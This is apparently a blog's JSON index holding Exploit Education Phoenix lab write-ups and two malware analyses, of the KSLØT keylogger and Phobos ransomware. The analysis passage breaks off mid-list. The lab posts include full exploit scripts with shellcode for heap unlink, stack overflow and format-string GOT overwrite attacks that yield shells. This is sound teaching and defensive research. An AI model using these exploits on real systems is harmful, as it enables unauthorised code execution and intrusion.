because at unlink [FD + 12] = BK.   BK will be just shellcode_address ([BK + 8] will be overwritten but we don’t care as our shellcode will be just 6 bytes long).   With that we are done with backward consolidation, now we need to adjust the size value to jump to an address which is in use (not free) to avoid calling unlink again which might cause a segmentation fault.   Here we will adjust the size to jump to chunk a, before forward consolidation the code first checks  nextinuse which will check the prev in use flag of chunk b to check if chunk a if free or not, here it’s not so the code will just avoid the forward consolidation. the difference between chunk a and c is 0xf7e69050 - 0xf7e69000 = 80 so chunk_size of c will be 0xffffffb0 = -80.   Solution:   # solve.py  from pwn import *  puts_addr = 0x804c13c shellcode_addr = 0xf7e6900c  '''   push 0x80487d5      # winner_address   ret ''' shellcode = '\\x68\\xd5\\x87\\x04\\x08\\xc3'   buff = \"\"  # first chunk buff += 'AAAA'\t\t\t# This will be overwritten with FD when free(a) buff += shellcode buff += ' '  # second chunk buff += 'B'*32\t\t\t# Fill the second chunk buff += p32(0xfffffffc)\t\t# prevsize of third chunk = -4 to jump inside itself when consolidating backward buff += p32(0xffffffb0)\t\t# size of third chunk = -80 to jump to first chunk when consolidating forward buff += ' '  # third chunk buff += 'AAAA'\t\t\t# junk buff += p32(puts_addr-12)\t# will be p-&gt;fd buff += p32(shellcode_addr)\t# will be p-&gt;bk  print(buff)   $ /opt/phoenix/i486/heap-three $(python solve.py) Level was successfully completed at @ 1580754261 seconds past the Epoch   This might not be the best explanation but this level really required a lot of reading from different resources to grasp the concepts.   Note that this exploit is already patched in newer version of malloc.   References:   https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/   https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/   https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/   https://www.youtube.com/watch?v=gL45bjQvZSU   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-three/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Net Zero",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/random.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   uint32_t i, j;    setvbuf(stdout, NULL, _IONBF, 0);   setvbuf(stderr, NULL, _IONBF, 0);   printf(\"%s\\n\", BANNER);    if (getrandom((void *)&amp;i, sizeof(i), 0) != sizeof(i)) {     errx(1, \"unable to getrandom(%d bytes)\", sizeof(i));   }    printf(\"Please send '%u' as a little endian, 32bit integer.\\n\", i);    if (read(0, (void *)&amp;j, sizeof(j)) != sizeof(j)) {     errx(1, \"unable to read %d bytes from stdin\", sizeof(j));   }    if (i == j) {     printf(\"You have successfully passed this level, well done!\\n\");   } else {     printf(\"Close - you sent %u instead\\n\", j);   }    return 0; }   The goal of this level is to read a random number from a server (localhost in this case) and send it back in little endian, nothing to explain here.   Solution:   # solve.py  from pwn import *  con = remote(\"localhost\", 64000)\t\t# connect to localhost on port 64000 print(con.recvline())\t\t\t\t# receive the greeting message  line = con.recvline()\t\t\t\t# receive the line containing the number num = int(line.split(\"\\'\")[1])\t\t\t# ['Please send ', '1948481594', ' as a little endian, 32bit integer.\\n']  con.send(p64(num))\t\t\t\t# convert to little endian  print(con.recv())\t\t\t\t# receive the final message   $ python solve.py  [+] Opening connection to localhost on port 64000: Done Welcome to phoenix/net-zero, brought to you by https://exploit.education  You have successfully passed this level, well done! [*] Closed connection to localhost port 64000  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/net-zero/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Net One",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdint.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/random.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   uint32_t i;   char buf[12], fub[12], *q;    setvbuf(stdout, NULL, _IONBF, 0);   setvbuf(stderr, NULL, _IONBF, 0);   printf(\"%s\\n\", BANNER);    if (getrandom((void *)&amp;i, sizeof(i), 0) != sizeof(i)) {     errx(1, \"unable to getrandom(%d bytes)\", sizeof(i));   }    if (write(1, &amp;i, sizeof(i)) != sizeof(i)) {     errx(1, \"unable to write %d bytes\", sizeof(i));   }    if (fgets(buf, sizeof(buf), stdin) == NULL) {     errx(1, \"who knew that reading from stdin could be so difficult\");   }   buf[sizeof(buf) - 1] = 0;    q = strchr(buf, '\\r');   if (q) *q = 0;   q = strchr(buf, '\\n');   if (q) *q = 0;    sprintf(fub, \"%u\", i);   if (strcmp(fub, buf) == 0) {     printf(\"Congratulations, you've passed this level!\\n\");   } else {     printf(\"Close, you sent \\\"%s\\\", and we wanted \\\"%s\\\"\\n\", buf, fub);   }    return 0; }   This code generates 4 random bytes integer and sends to to the receiver as raw bytes.   The goal here is to convert these bytes to a number then send it as ascii string to the server.   Solution:   # solve.py  from pwn import *  con = remote(\"localhost\", 64001)\t\t# connect to localhost on port 64001 print(con.recvline())\t\t\t\t# receive the greeting message  num_bytes = con.recv(4)\t\t\t\t# receive the 32bit random number (4 bytes) num = str(u32(num_bytes))\t\t\t# u32() to convert from bytes to integer con.send(num + \"\\n\")\t\t\t\t# send the number as ascii string  print(con.recv())\t\t\t\t# receive the final message   $ python solve.py [+] Opening connection to localhost on port 64001: Done Welcome to phoenix/net-one, brought to you by https://exploit.education  Congratulations, you've passed this level! [*] Closed connection to localhost port 64001  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/net-one/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Net Two",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/random.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   int i;   unsigned long quad[sizeof(long)], result, wanted;    setvbuf(stdout, NULL, _IONBF, 0);   setvbuf(stderr, NULL, _IONBF, 0);   printf(\"%s\\nFor this level, sizeof(long) == %d, keep that in mind :)\\n\",       BANNER, (int)sizeof(long));    if (getrandom((void *)&amp;quad, sizeof(quad), 0) != sizeof(quad)) {     errx(1, \"unable to getrandom(%d bytes)\", sizeof(quad));   }    result = 0;   for (i = 0; i &lt; sizeof(long); i++) {     result += quad[i];     if (write(1, (void *)&amp;quad[i], sizeof(long)) != sizeof(long)) {       errx(1, \"Why have you foresaken me, write()\");     }   }    if (read(0, (void *)&amp;wanted, sizeof(long)) != sizeof(long)) {     errx(1, \"Unable to read\\n\");   }    if (result == wanted) {     printf(\"You have successfully passed this level, well done!\\n\");   } else {     printf(\"Whoops, better luck next time. Receieved %lu, wanted %lu\\n\", wanted,         result);   }    return 0; }   This level gets 64 random bytes and stores them in quad then it loops over quad 8 bytes at a time and adds these bytes to result.   So we will read 8 long numbers, add them and send the sum back.   It’s important to account for potential integer overflow using the bit mask 0xffffffffffffffff.   Solution:   # solve.py  from pwn import *  con = remote(\"localhost\", 64002)\t\t# connect to localhost on port 64002 print(con.recvline())\t\t\t\t# recieve the greeting message print(con.recvline())\t\t\t\t# recieve the size message  sum = 0 for i in range(8): \tsum += u64(con.recv(8))\t\t\t# receive size(long) bytes then convert to long number  sum &amp;= 0xffffffffffffffff\t\t\t# 64bit mask to avoid integer overflow  con.send(p64(sum))\t\t\t\t# send the resulting sum  print(con.recv())\t\t\t\t# receive the final message   $ python solve.py  [+] Opening connection to localhost on port 64002: Done Welcome to phoenix/net-two, brought to you by https://exploit.education  For this level, sizeof(long) == 8, keep that in mind :)  You have successfully passed this level, well done!  [*] Closed connection to localhost port 64002   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/net-two/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Final Zero",
        "excerpt":"#include &lt;ctype.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *s);  /*  * Read the username in from the network  */  char *get_username() {   char buffer[512];   char *q;   int i;    memset(buffer, 0, sizeof(buffer));   gets(buffer);    /* Strip off trailing new line characters */   q = strchr(buffer, '\\n');   if (q) *q = 0;   q = strchr(buffer, '\\r');   if (q) *q = 0;    /* Convert to lower case */   for (i = 0; i &lt; strlen(buffer); i++) {     buffer[i] = toupper(buffer[i]);   }    /* Duplicate the string and return it */   return strdup(buffer); }  int main(int argc, char **argv, char **envp) {   char *username;    printf(\"%s\\n\", BANNER);   fflush(stdout);    username = get_username();   printf(\"No such user %s\\n\", username); }   This level has a classic stack buffer overflow through gets function, so we inject our shellcode in the buffer then overflow the buffer and jump to our shellcode address, easy right :)   The problem here is the for loop that converts every character in our buffer to uppercase using toupper function, so our shellcode will be ruined.   If we look before the for loop we can see that the code terminates the buffer at any newline \\n or carriage return \\r.   If we enter a newline our input will terminate anyway so nothing to do here but the carriage return \\r doesn’t terminate the input, we can see the man page for get:   DESCRIPTION        Never use this function.        gets()  reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0').   As we see gets will terminate the input on ‘\\n’ and ‘\\0’ only, great.   So the exploit here is to place our shellcode after \\r with will be replaced by ‘\\0’ so that the for loop can’t reach our shellcode (strlen stops at ‘\\0’).   $ gdb -q /opt/phoenix/amd64/final-zero  Reading symbols from /opt/phoenix/amd64/final-zero...(no debugging symbols found)...done.  gef➤  disassemble get_username  Dump of assembler code for function get_username: .....    0x00000000004007f2 &lt;+37&gt;:\tlea    rax,[rbp-0x220]    0x00000000004007f9 &lt;+44&gt;:\tmov    rdi,rax    0x00000000004007fc &lt;+47&gt;:\tcall   0x4005d0 &lt;gets@plt&gt;    0x0000000000400801 &lt;+52&gt;:\tlea    rax,[rbp-0x220] .....  gef➤  b *0x0000000000400801 Breakpoint 1 at 0x400801  gef➤  r Starting program: /opt/phoenix/amd64/final-zero  Welcome to phoenix/final-zero, brought to you by https://exploit.education AAAAAAAA Breakpoint 1, 0x0000000000400801 in get_username ()  gef➤  x/xg $rbp-0x220 0x7fffffffe410:\t0x4141414141414141   The buffer is at offset 0x220 = 544 bytes and it’s at address 0x7fffffffe410, great (not really).   If you tried to overwrite RIP with this address the exploit won’t work so we should investigate more.   We need to debug the process we are sending the payload to instead of debugging locally, so we will open two terminals one for the connection and another for gdb.   # First Terminal:  $ nc localhost 64003 Welcome to phoenix/final-zero, brought to you by https://exploit.education   # Second Terminal:  $ ps aux | grep final phoenix+ 14770  0.5  0.0    752     4 ?        Ss   18:55   0:00 /opt/phoenix/amd64/final-zero user     14772  0.0  0.0   5136   984 pts/2    S+   18:55   0:00 grep final  $ sudo gdb -p 14770 Attaching to process 14770 Reading symbols from target:/opt/phoenix/amd64/final-zero...(no debugging symbols found)...done.  gef➤  b *0x0000000000400801 Breakpoint 1 at 0x400801  gef➤  c Continuing.   Now enter some input in the first terminal like “AAAAAAAA”.   Breakpoint 1, 0x0000000000400801 in get_username ()  gef➤  x/xg $rbp-0x220 0x7fffffffea60: 0x4141414141414141   As you can see the address of buffer if very far from our first address, offset between them = 0x7fffffffea60 - 0x7fffffffe410 = 1616 bytes.   So we will replace our RIP with an address close enough to 0x7fffffffea60 and we are done.   Solution:   # solve.py  from pwn import *  shellcode = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'  con = remote('localhost', 64003) print(con.recvline())\t\t\t\t\t# receive the greeting message  buff = \"\" buff += 'A'*7 + '\\r'\t\t\t\t\t# JUNK buff += '\\x90'*200\t\t\t\t\t# some NOPS buff += shellcode\t\t\t\t\t# our shellcode buff += 'A' * (544 - len(buff))\t\t\t\t# JUNK buff += 'BBBBBBBB'\t\t\t\t\t# RBP value buff += p64(0x7fffffffea90)\t\t\t\t# RIP value  con.send(buff)\t\t\t\t\t\t# send the payload con.interactive()\t\t\t\t\t# interactive shell   $ python solve.py  [+] Opening connection to localhost on port 64003: Done Welcome to phoenix/final-zero, brought to you by https://exploit.education [*] Switching to interactive mode  $ whoami phoenix-amd64-final-zero  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/final-zero/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Final One",
        "excerpt":"#include &lt;arpa/inet.h&gt; #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;syslog.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char username[128]; char hostname[64]; FILE *output;  void logit(char *pw) {   char buf[2048];    snprintf(buf, sizeof(buf), \"Login from %s as [%s] with password [%s]\\n\",       hostname, username, pw);    fprintf(output, buf); }  void trim(char *str) {   char *q;    q = strchr(str, '\\r');   if (q) *q = 0;   q = strchr(str, '\\n');   if (q) *q = 0; }  void parser() {   char line[128];    printf(\"[final1] $ \");    while (fgets(line, sizeof(line) - 1, stdin)) {     trim(line);     if (strncmp(line, \"username \", 9) == 0) {       strcpy(username, line + 9);     } else if (strncmp(line, \"login \", 6) == 0) {       if (username[0] == 0) {         printf(\"invalid protocol\\n\");       } else {         logit(line + 6);         printf(\"login failed\\n\");       }     }     printf(\"[final1] $ \");   } }  int testing;  void getipport() {   socklen_t l;   struct sockaddr_in sin;    if (testing) {     strcpy(hostname, \"testing:12121\");     return;   }    l = sizeof(struct sockaddr_in);   if (getpeername(0, (void *)&amp;sin, &amp;l) == -1) {     err(1, \"you don't exist\");   }    sprintf(hostname, \"%s:%d\", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port)); }  int main(int argc, char **argv, char **envp) {   if (argc &gt;= 2) {     testing = !strcmp(argv[1], \"--test\");     output = stderr;   } else {     output = fopen(\"/dev/null\", \"w\");     if (!output) {       err(1, \"fopen(/dev/null)\");     }   }    setvbuf(stdout, NULL, _IONBF, 0);   setvbuf(stderr, NULL, _IONBF, 0);    printf(\"%s\\n\", BANNER);    getipport();   parser();    return 0; }   If you take a quick look at the code you can spot the format string bug in logit function, let’s trace back to find where it’s called.   It’s called in parser function, this function takes two kinds of input (username followed by a string OR login).   username STRING stores the string in line and login calls logit function with that string as argument.   The bug here is that snprintf copies the string argument to buf then fprintf prints this string without using %s, hence the bug.   $ /opt/phoenix/i486/final-one --test Welcome to phoenix/final-one, brought to you by https://exploit.education [final1] $ username AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x  [final1] $ login  Login from testing:12121 as [AAAA0.0.69676f4c.7266206e.74206d6f.69747365.313a676e.31323132.20736120.4141415b.2e782541.252e7825.78252e78.2e78252e.252e7825] with password [] login failed   We can see that AAA appears at 9th place with 5b as first byte so we will use AAA as offset then we enter the address we want to write to, but first we choose a good address.   The best choice if to overwrite a GOT entry, here we will overwrite the address of printf.   So we need to know the address of the buffer that will contain the shellcode. Open two terminals (you can use tmux or screen):   # First Terminal $ nc localhost 64014 Welcome to phoenix/final-one, brought to you by https://exploit.education [final1] $   # Second Terminal  $ ps aux | grep final phoenix+  1114  0.0  0.0    736     8 ?        Ss   12:17   0:00 /opt/phoenix/i486/final-one user      1134  0.0  0.0   5136   984 pts/3    S+   12:18   0:00 grep final  $ sudo gdb -p 1114 Attaching to process 1114 Reading symbols from target:/opt/phoenix/i486/final-one...(no debugging symbols found)...done.  gef➤  disassemble logit Dump of assembler code for function logit: .....    0x08048827 &lt;+66&gt;:    call   0x80485a0 &lt;fprintf@plt&gt;    0x0804882c &lt;+71&gt;:    add    esp,0x10 .....  gef➤  b *0x0804882c Breakpoint 1 at 0x804882c  gef➤  c Continuing.   # First Terminal  [final1] $ username AAAAA [final1] $ login   # Second Terminal  gef➤  x/16xw $ebp-0x808 0xffffd490:     0x69676f4c      0x7266206e      0x31206d6f      0x302e3732 0xffffd4a0:     0x312e302e      0x3134333a      0x61203234      0x415b2073 0xffffd4b0:     0x41414141      0x6977205d      0x70206874      0x77737361 0xffffd4c0:     0x2064726f      0x000a5d5b      0x00000000      0x00000000   We can see that our input appears at 0xffffd4b0 with just one byte offset before (so we need just one byte offset instead of three).   $ objdump -R /opt/phoenix/i486/final-one | grep printf 08049e48 R_386_JUMP_SLOT   printf   printf is at 08049e48, now we are ready to write the exploit.   Solution:   # solve.py  from pwn import *  printf = 0x08049e48 buffer = 0xffffd4c0 shellcode = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'  buff = \"\" buff += 'username A'\t\t# A is just an offset  buff += p32(printf+0) buff += 'AAAA'\t\t\t# JUNK that will be popped with second %x buff += p32(printf+1) buff += 'AAAA'\t\t\t# JUNK that will be popped with third %x buff += p32(printf+2) buff += 'AAAA'\t\t\t# JUNK that will be popped with forth %x buff += p32(printf+3)  buff += shellcode  buff += '%x' * 9 buff += '%45x %n'\t\t# first byte 0xc8 buff += '%19x %n'\t\t# second byte 0xd4 buff += '%42x %n'\t\t# third byte 0xff buff += '%255x %n \\n'\t\t# forth byte 0xff buff += 'login \\n'  p = remote('localhost', 64014) print(p.recvline())  p.send(buff) p.interactive()   Notice that we used AAAA between addresses because we use %nx instead of normal characters which will pop an a value from the stack.   $ python x.py [+] Opening connection to localhost on port 64014: Done Welcome to phoenix/final-one, brought to you by https://exploit.education  [*] Switching to interactive mode [final1] $ [final1] $ login failed  $ whoami phoenix-i386-final-one  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/final-one/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Deep Analysis of KSLØT Keylogger (Turla APT)",
        "excerpt":"Sample MD5: 59b57bdabee2ce1fb566de51dd92ec94   First I used DIE to see what type of binary we have, It seems that it’s a 64 bit DLL.      Next I loaded the dll into pestudio, we can see that is has a small number of imports and readable strings so I suspected that it loads the required functions dynamically (using LoadLibrary and GetProcAddress).         Now let’s fire up IDA and see how it goes.   First we see a call to sub_1800017D0.      This function calls a sub routine multiple times with parameters pointing to the .data section, so it might be decrypting some data.      If we take a look at maybe_decrypt function we can see that it XORs the data with some byte array so we can safely say that it’s a decryption routine.      Here we have two options, we can use a debugger to decrypt the data or we can use IDA Python to do that, for simplicity I will use a debugger here. we set a breakpoint after the call and examine the .data section in the dump.      Decrypted Data:  ..int.......................................................KSL0 .TVer=21.0.._msimm.dat..SPUNINST.....Start.[u]:.[-h GetForegroun dWindow]:%d......[%02d.%02d.%04d %02d:%02d:%02d.%03d]...[h]:%d.. [-pid GetWindowThreadProcessId]:%d......[-k GetWindowThreadProce ssId]:%d....[pid]:%d....[-OpenProcess]:%d...[-pn GetModuleFileNa meEx]:%d....[pn]:%s.....[-t GetWindowText]:%d...[t]:%s..&lt;#RShift &gt;&lt;#LShift&gt;&lt;#RCtrl&gt;&lt;#LCtrl&gt;&lt;!RShift&gt;&lt;!LShift&gt;&lt;!RCtrl&gt;&lt;!LCtrl&gt;-+[] \\;/`',.&lt;PageUp&gt;&lt;PageDown&gt;&lt;NumLock&gt;&lt;r/&gt;&lt;r*&gt;&lt;r-&gt;&lt;r+&gt;&lt;r1&gt;&lt;r2&gt;&lt;r3&gt;&lt;r 4&gt;&lt;r5&gt;&lt;r6&gt;&lt;r7&gt;&lt;r8&gt;&lt;r9&gt;&lt;r0&gt;&lt;r.&gt;&lt;F1&gt;&lt;F2&gt;&lt;F3&gt;&lt;F4&gt;&lt;F5&gt;&lt;F6&gt;&lt;F7&gt;&lt;F8&gt;&lt;F 9&gt;&lt;F10&gt;&lt;F11&gt;&lt;F12&gt;&lt;Down&gt;&lt;Up&gt;&lt;Right&gt;&lt;Left&gt;&lt;Del&gt;&lt;Print&gt;&lt;End&gt;&lt;Insert &gt;&lt;CapsLock&gt;&lt;Enter&gt;&lt;Backspace&gt;&lt;Esc&gt;&lt;Tab&gt;.kernel32.dll............n   The decrypted data has some strings like &lt;F1&gt; ans &lt;LShift&gt;, we can assume that they are used to record the keystrokes.   Next we see a call to GetModuleHandleW and GetProcAddress then the results are passed as arguments along with the qword array unk_1800105A0 to sub_1800039C0. The module is kernel32.dll and the proc is GetProcAddress handle.   sub_1800039C0 is a huge function and it looks scary at first.      First this function stores the parameters in local variables then it stores some values into the rest of local variables, so far so good.   Next there is a call to sub_180001000 multiple times with the previously filled local variables as parameters.         Here we can see the data XORed with 0x55 so this function is used to decrypt the values of the local variables.   After the decryption routine we see a call to GetProcAddress, using the debugger we can see that it returns a handle to LoadLibraryA.      After that it loads the needed libraries then fills the qword array with the needed functions.      To get the imported functions I used the debugger to get them one by one (definitely there is a better option but I’m lazy). Then I used IDA Python to rename the addresses with the corresponding function names.   Imported Functions:  \"GetProcessImageFileNameW\" \"GetForegroundWindow\" \"GetWindowThreadProcessId\" \"GetWindowTextW\" \"GetKeyboardState\" \"GetKeyboardLayout\" \"ToUnicodeEx\" \"MapVirtualKeyExW\" \"CallNextHookEx\" \"SetWindowsHookExW\" \"UnhookWindowsHookEx\" \"GetMessageW\" \"TranslateMessage\" \"DispatchMessageW\" \"CommandLineToArgvW\" \"swprintf\" \"wcsncat\" \"wcsstr\" \"wcscat\" \"malloc\" \"memset\" \"memcpy\" \"strlen\" \"wcslen\" \"wcsrchr\" \"free\" \"GetSystemTime\" \"GetLastError\" \"OpenProcess\" \"CreateThread\" \"SystemTimeToFileTime\" \"FileTimeToSystemTime\" \"FileTimeToLocalFileTime\" \"CreateMutexW\" \"OpenMutexW\" \"GetFileSize\" \"lstrcatW\" \"GetModuleFileNameW\" \"FindFirstFileW\" \"FindClose\" \"CreateFileW\" \"SetFilePointer\" \"WriteFile\" \"CloseHandle\" \"GetProcAddress\" \"LoadLibraryA\" \"GetUserNameExW\"   import idc  base = 0x1800105A0  names = [\"GetProcessImageFileNameW\", \"GetForegroundWindow\", \"GetWindowThreadProcessId\",           \"GetWindowTextW\", \"GetKeyboardState\", \"GetKeyboardLayout\", \"ToUnicodeEx\",          \"MapVirtualKeyExW\", \"CallNextHookEx\", \"SetWindowsHookExW\", \"UnhookWindowsHookEx\",          \"GetMessageW\", \"TranslateMessage\", \"DispatchMessageW\", \"CommandLineToArgvW\",          \"swprintf\", \"wcsncat\", \"wcsstr\", \"wcscat\", \"malloc\", \"memset\", \"memcpy\", \"strlen\",          \"wcslen\", \"wcsrchr\", \"free\", \"GetSystemTime\", \"GetLastError\", \"OpenProcess\",           \"CreateThread\", \"SystemTimeToFileTime\", \"FileTimeToSystemTime\", \"FileTimeToLocalFileTime\",          \"CreateMutexW\", \"OpenMutexW\", \"GetFileSize\", \"lstrcatW\", \"GetModuleFileNameW\",           \"FindFirstFileW\", \"FindClose\",\"CreateFileW\", \"SetFilePointer\", \"WriteFile\", \"CloseHandle\",          \"GetProcAddress\", \"LoadLibraryA\", \"GetUserNameExW\"]  offsets = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 36, 37, 38, 39, 40, 41, 42,             43, 44, 45, 46, 47, 15, 16, 17, 18, 19, 20, 21, 23, 24, 22, 25, 26, 27, 28,            29, 30, 31, 32, 33, 34, 35]  for i in range(47): \tidc.set_name(base + (offsets[i] * 8), '__' + names[i])      Viola!!! great success, now for reversing the real keylogger functionality.   Back to the main function, the malware gets the username and domain name of the machine then creates a Mutex with the name DOMAIN_NAME.USER_NAME (in my case it was IEUSER-PC.IEUSER).         The last call is to sub_180003960 which create a new thread with a starting address at sub_180001B70      This function listens for windows messages (keystrokes in this case), but first it calls setup_the_hook function.      This function sets up the keyboard hook with the callback keyboardProc.      The callback function deals with all the keyboard keys with a huge switch statement. Each block of this switch loads the keyboard_consts character array (which was decrypted earlier while decrypting the .data section) then adds an offset to this consts array to get the right character for the corresponding key and concatenates it with the keystroke variable. This variable is passed as a parameter along with it’s length to sub_180001100 which I suspect is the logging function.      This function is quite long and complex but we can see a call to WriteFIle at the end of it, also note the loop with XORing which indicates that the logs are encrypted before being written.      Moving up we can see the call to CreateFileW, to get the new file path we can let the malware run in x64dbg.   The malware creates a file with the name msimm.dat (which was in the decrypted .data section) in the same directory of the malware.      If we take a look at the created file we see some garbage because the file was encrypted before being written.      We can write a small script to decrypt this file using the encryption keys.      The encryption process is just XOR with the encryption keys.   encryption_keys = [0x0a, 0x19, 0x59, 0x2d, 0x6c, 0x59, 0x6f, 0xfa, 0x8b, 0x6f, 0x9b, 0xff, 0x37,                     0x9b, 0xbd, 0x7b, 0x59, 0x4b, 0x7b, 0xdd, 0x0f, 0x64, 0x91, 0xc7, 0xd6, 0x9c,                    0x6f, 0x7b, 0x9c, 0x01, 0x9c, 0x91, 0x79, 0xc7, 0xc8, 0xc9, 0xdf, 0xe1, 0xfa,                    0xff, 0x04, 0x08, 0x59, 0xe6, 0x64, 0x6d, 0x37, 0x9b, 0x38, 0x81, 0x2d, 0x81,                    0x65, 0x7d, 0x66, 0x9a, 0x6f, 0xbd, 0x65, 0x59, 0x4b, 0x2d, 0x1a, 0x63, 0x59,                    0x7b, 0x65, 0x59, 0x59, 0x0b, 0x4e, 0x85, 0x8c, 0x91, 0x88, 0x59, 0x0c, 0x01,                    0x4e, 0x3a, 0x0d, 0x58, 0x38, 0x16, 0x91, 0x57, 0x7e, 0x68, 0x6a, 0x55, 0x42,                    0x55, 0x5d, 0xc5, 0x9e, 0x4e, 0x17, 0x3b, 0x0f, 0x42]  decrypted_data = []  with open(\"msimm.dat\", \"rb\") as file: \tdata = file.read() \ti = 0 \tfor c in data: \t\tdecrypted_data.append(c^encryption_keys[i]) \t\ti = (i+1)%100  with open(\"decrypted.dat\", \"wb\") as file: \tfile.write(bytearray(decrypted_data))   Looking at the decrypted file:      Great!!! We can see the logs for each process and that wraps up this analysis.   IOCs:   Hashes:   The keylogger: 59b57bdabee2ce1fb566de51dd92ec94   Mutexes:   $DOMAIN_NAME.$USER_NAME   Files:   msimm.dat  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/ksl0t-keylogger/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/ksl0t-keylogger/12.png"
      },{
        "title": "Deep Analysis of Phobos Ransomware",
        "excerpt":"sample SHA256: a91491f45b851a07f91ba5a200967921bf796d38677786de51a4a8fe5ddeafd2   Initial Analysis   First I loaded the binary into pestudio.   We can see some interesting imports with different functionalities like: file traversal, crypto stuff, file read&amp;write, processes traversal, …        There is not much readable strings here which might indicate the strings are somewhat obfuscated.      Behavioral analysis   If we run ransomware we can see that it asks for administrator privileges.      If we accept it and use ProcessHacker we can see that it spawns another copy of itself with the elevated privileges.      Using Autoruns from sysinternals we can see that it adds a value to the registry and copies itself to the startup folder to maintain persistence, which means that it can encrypt new files.      If we let the ransomware run for while we can see it drops its note in two formats: .hta &amp; .txt         The encrypted files are renamed to &lt;Original Name&gt;.id[&lt;Victim ID&gt;].[lockhelp@qq.com].&lt;Ransomware extension&gt;   Going Deep   Now Let’s fire up IDA and see how it goes.   The winMain function just calls main_function.      main_function creates a bunch of threads for different tasks like traversing and encrypting files, killing blacklisted processes and so on.   Killing Blacklisted Processes   The ransomware loops through running processes to search and kill blacklisted ones at sub_4032FA                                    The blacklisted processes are passed to this function as an argument, we can go a step back using Xrefs to know what the blacklisted processes are.   The caller function calls sub_403E72 first, using a debugger we can see the list of the processes returned.      Here is the complete list:   msftesql.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe mydesktopqos.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe agntsvc.exe agntsvc.exe agntsvc.exe encsvc.exe firefoxconfig.exe tbirdconfig.exe ocomm.exe mysqld.exe mysqld-nt.exe mysqld-opt.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe 